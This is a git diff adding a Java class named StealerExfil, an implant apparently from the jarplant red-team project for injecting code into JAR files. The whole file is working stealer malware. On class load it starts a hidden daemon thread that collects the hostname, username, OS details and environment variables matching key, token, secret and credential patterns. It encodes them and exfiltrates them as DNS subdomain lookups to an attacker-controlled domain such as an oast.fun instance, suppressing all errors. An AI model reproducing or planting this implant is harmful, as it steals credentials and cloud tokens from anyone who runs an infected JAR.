@@ -1,0 +1,315 @@
+package io.github.w1th4d.jarplant.implants;
+
+import java.math.BigInteger;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
+import java.security.SecureRandom;
+import java.util.*;
+
+public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
+    public static final String TOKEN_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_.:,;<>|!\"#¤%&/()=+?`'^~'*@()[]{} \n\\";
+    public static final String URL_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789";
+
+    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
+    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
+    static volatile int CONF_DELAY_MS = 0;
+
+    /**
+     * Domain to use for data exfiltration.
+     * Data will be encoded and included as subdomains to the specified domain.
+     * Set this to an Interactsh instance (or equivalent) under your control. Example: 'abdcef12345.oast.fun'.
+     */
+    static volatile String CONF_DOMAIN;
+
+    /**
+     * Maximum number of characters for each subdomain.
+     * DNS specifies a maximum number of 63 characters.
+     * A custom value may be set if there are concerns that upstream DNS servers may dislike a large number of
+     * subdomains.
+     * Note: This simple implant will just exclude any excess characters from an over-sized field (resulting in data
+     * loss).
+     */
+    static volatile int CONF_SUBDOMAIN_MAX_LEN = 63;
+
+    /**
+     * Maximum length of the whole fully-qualified domain name.
+     * DNS specifies a maximum total length of a domain name (all subdomains) of 255 characters. However, there need to
+     * be space for the length octet and a 0, so the actual max length of a domain name is 253.
+     * A custom value may be set if there are concerns that upstream DNS servers may dislike large requests.
+     * Note: This simple implant will just exclude any encoded data fields that does not fit.
+     */
+    static volatile int CONF_FQDN_MAX_LEN = 253;
+
+    @SuppressWarnings("unused")
+    public static void init() {
+        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
+            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
+                StealerExfil implant = new StealerExfil();
+                Thread background = new Thread(implant);
+                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
+                background.setUncaughtExceptionHandler(implant);
+                background.start();
+            }
+        }
+    }
+
+    @Override
+    public void run() {
+        if (CONF_DELAY_MS > 0) {
+            try {
+                Thread.sleep(CONF_DELAY_MS);
+            } catch (InterruptedException ignored) {
+            }
+        }
+
+        payload(System.getenv(), System.getProperties());
+    }
+
+    @Override
+    public void uncaughtException(Thread thread, Throwable throwable) {
+        // Silently ignore (don't throw up error messages on stderr)
+    }
+
+    void payload(Map<String, String> envVars, Properties javaProps) {
+        if (CONF_DOMAIN == null || CONF_DOMAIN.isEmpty()) {
+            return;
+        }
+
+        Map<String, String> exfilData = new LinkedHashMap<>();
+        exfilData.put("host", getHostname());
+        //exfilData.put("host", "test-host-01");    // For testing...
+        exfilData.put("user", getUsername(envVars, javaProps));
+        exfilData.put("os", getOsInfo(javaProps));
+        exfilData.put("jvm", getRuntimeInfo(javaProps));
+        exfilData.putAll(getJuicyEnvVars(envVars));
+
+        String packed = pack(exfilData);
+        //System.out.println("Encoding and exfiltrating the following data:\n" + packed);
+        String encoded = rebase(packed, TOKEN_ALPHABET, URL_ALPHABET);
+        String uniqueId = getUniqueId();
+        List<String> requests = split(encoded, uniqueId, CONF_DOMAIN);
+
+        for (String request : requests) {
+            //System.out.println("Not actually resolving: " + request);
+            resolve(request);   // Comment out this line during testing
+        }
+    }
+
+    static Map<String, String> getJuicyEnvVars(Map<String, String> env) {
+        final Set<String> interesting = Set.of(
+                "_KEY",
+                "_TOKEN",
+                "_ID",
+                "_SECRET",
+                "_CREDENTIALS",
+                "_CRED",
+                "_PROJECT",
+                "CLOUD_",
+                "_DOMAIN",
+                "_SID"
+        );
+
+        Map<String, String> found = new HashMap<>();
+        for (Map.Entry<String, String> entry : env.entrySet()) {
+            String key = entry.getKey();
+            String value = entry.getValue();
+
+            for (String lookingFor : interesting) {
+                if (key.contains(lookingFor)) {
+                    found.put(key, value);
+                }
+            }
+        }
+
+        return found;
+    }
+
+    static String pack(Map<String, String> kv) {
+        StringBuilder output = new StringBuilder();
+
+        for (Map.Entry<String, String> entry : kv.entrySet()) {
+            String key = entry.getKey();
+            String value = entry.getValue();
+
+            output.append(key).append("=").append(value).append("\n");
+        }
+
+        return output.toString();
+    }
+
+    public static String rebase(CharSequence input, String fromAlphabet, String toAlphabet) {
+        final BigInteger FROM_BASE = BigInteger.valueOf(fromAlphabet.length());
+        final BigInteger TO_BASE = BigInteger.valueOf(toAlphabet.length());
+
+        BigInteger accumulator = BigInteger.ZERO;
+        int digitPlace = 0;
+        long trailingZeroCodes = 0;
+
+        // Assume all input characters to be of Base-X and add them all up into a big integer
+        for (int inputIndex = 0; inputIndex < input.length(); inputIndex++) {
+            char inputChar = input.charAt(inputIndex);
+            int compactCode = fromAlphabet.indexOf(inputChar);
+            if (compactCode == -1) {
+                // Input character is outside the expected alphabet - skip it
+                continue;   // Continue with the next input char but do _not_ increase digitPlace
+            } else {
+                // Math: accumulator += compactCode * FROM_BASE^digitPlace
+                BigInteger compactCodeBig = BigInteger.valueOf(compactCode);
+                BigInteger significance = FROM_BASE.pow(digitPlace);
+                BigInteger valueIncrease = compactCodeBig.multiply(significance);
+                accumulator = accumulator.add(valueIncrease);
+                digitPlace++;
+            }
+
+            // Keep track of the amount of zeroth compact codes at the end (but only at the end)
+            if (compactCode == 0) {
+                trailingZeroCodes++;
+            } else {
+                trailingZeroCodes = 0;
+            }
+        }
+
+        // accumulator now holds all input values
+
+        // Draw Base-Y values out of the accumulator until it's empty
+        StringBuilder output = new StringBuilder();
+        while (accumulator.compareTo(BigInteger.ZERO) > 0) {
+            BigInteger[] divmod = accumulator.divideAndRemainder(TO_BASE);
+            BigInteger div = divmod[0];
+            BigInteger mod = divmod[1];
+
+            int compactCode = mod.intValue();
+            // This is probably a good opportunity to combine compactCode with a stream cipher
+            char toBaseChar = toAlphabet.charAt(compactCode);
+            output.append(toBaseChar);
+            accumulator = div;
+        }
+
+        // Due to some math quirks, the last character will be lost if its index is 0. Compensate for this.
+        for (int i = 0; i < trailingZeroCodes; i++) {
+            output.append(toAlphabet.charAt(0));
+        }
+
+        return output.toString();
+    }
+
+    static List<String> split(String encodedData, String uniqueId, String baseDomain) {
+        List<String> requests = new LinkedList<>();
+
+        if (!baseDomain.startsWith(".")) {
+            baseDomain = "." + baseDomain;
+        }
+        if (uniqueId.length() + 5 + baseDomain.length() >= CONF_FQDN_MAX_LEN - CONF_SUBDOMAIN_MAX_LEN) {
+            return Collections.emptyList(); // Not a very good error handling
+        }
+
+        List<String> splits = new LinkedList<>();
+        while (!encodedData.isEmpty()) {
+            if (encodedData.length() > CONF_SUBDOMAIN_MAX_LEN) {
+                String subdomain = encodedData.substring(0, CONF_SUBDOMAIN_MAX_LEN);
+                encodedData = encodedData.substring(CONF_SUBDOMAIN_MAX_LEN);
+                splits.add(subdomain);
+            } else {
+                splits.add(encodedData);
+                encodedData = "";
+            }
+        }
+
+        StringBuilder request = new StringBuilder();
+        int sequenceNumber = 0;
+        request.append(uniqueId).append("-").append(sequenceNumber++).append(baseDomain);
+        Collections.reverse(splits);    // TODO Come up with something more elegant than this
+        for (String split : splits) {
+            if (split.length() + ".".length() + request.length() > CONF_FQDN_MAX_LEN) {
+                // This DNS request is full. Finalize it and begin on a new one.
+                requests.add(request.toString());
+                request = new StringBuilder();
+                request.append(uniqueId).append("-").append(sequenceNumber++).append(baseDomain);
+            }
+
+            request.insert(0, split + ".");
+        }
+        requests.add(request.toString());   // TODO Sloppy
+
+        return requests;
+    }
+
+    // Use the default system resolver for now
+    static void resolve(String domain) {
+        try {
+            //noinspection ResultOfMethodCallIgnored
+            InetAddress.getByName(domain);
+        } catch (UnknownHostException ignored) {
+        }
+    }
+
+    private static String getHostname() {
+        String hostname = "unknown";
+        try {
+            hostname = InetAddress.getLocalHost().getHostName();
+        } catch (UnknownHostException ignored) {
+        }
+
+        return hostname;
+    }
+
+    private static String getUsername(Map<String, String> envVars, Properties javaProps) {
+        String username = javaProps.getProperty("user.name");
+        if (isUnknown(username)) {
+            username = envVars.get("USERNAME");
+            if (isUnknown(username)) {
+                username = "unknown";
+            }
+        }
+        return username;
+    }
+
+    private String getOsInfo(Properties javaProps) {
+        String osName = javaProps.getProperty("os.name");
+        if (isUnknown(osName)) {
+            osName = "unknown";
+        }
+
+        String osVer = javaProps.getProperty("os.version");
+        if (isUnknown(osVer)) {
+            osVer = "unknown";
+        }
+
+        return osName + " " + osVer;
+    }
+
+    private static String getRuntimeInfo(Properties javaProps) {
+        String runtimeVer = javaProps.getProperty("java.vm.version");
+        if (isUnknown(runtimeVer)) {
+            runtimeVer = "unknown";
+        }
+        return runtimeVer;
+    }
+
+    private static boolean isUnknown(String value) {
+        return value == null || value.isEmpty();
+    }
+
+    private static String getUniqueId() {
+        Random rng = new SecureRandom();
+        return "" + rng.nextInt(0, Integer.MAX_VALUE);
+    }
+
+    // This method can be used to generate some synthesised test data. This can't override the hostname, though. :P
+//    public static void main(String[] args) {
+//        Map<String, String> testEnv = new HashMap<>();
+//        testEnv.put("HOSTNAME", "test-host-01");
+//        testEnv.put("USERNAME", "service-user");
+//        testEnv.put("CLOUD_SECRET_UID", "secret-id");
+//        testEnv.put("CLOUD_API_TOKEN", "super-sensitive-api-token");
+//        Properties testProps = new Properties();
+//        testProps.put("os.name", "Linux");
+//        testProps.put("os.version", "v1.2.3-something4");
+//        testProps.put("java.vm.version", "UberJDK v1.2.3-something4");
+//
+//        StealerExfil.CONF_DOMAIN = "abc123.oast.fun";
+//        StealerExfil.CONF_SUBDOMAIN_MAX_LEN = 20;
+//        StealerExfil.CONF_FQDN_MAX_LEN = 100;
+//        new StealerExfil().payload(testEnv, testProps);
+//    }
+}
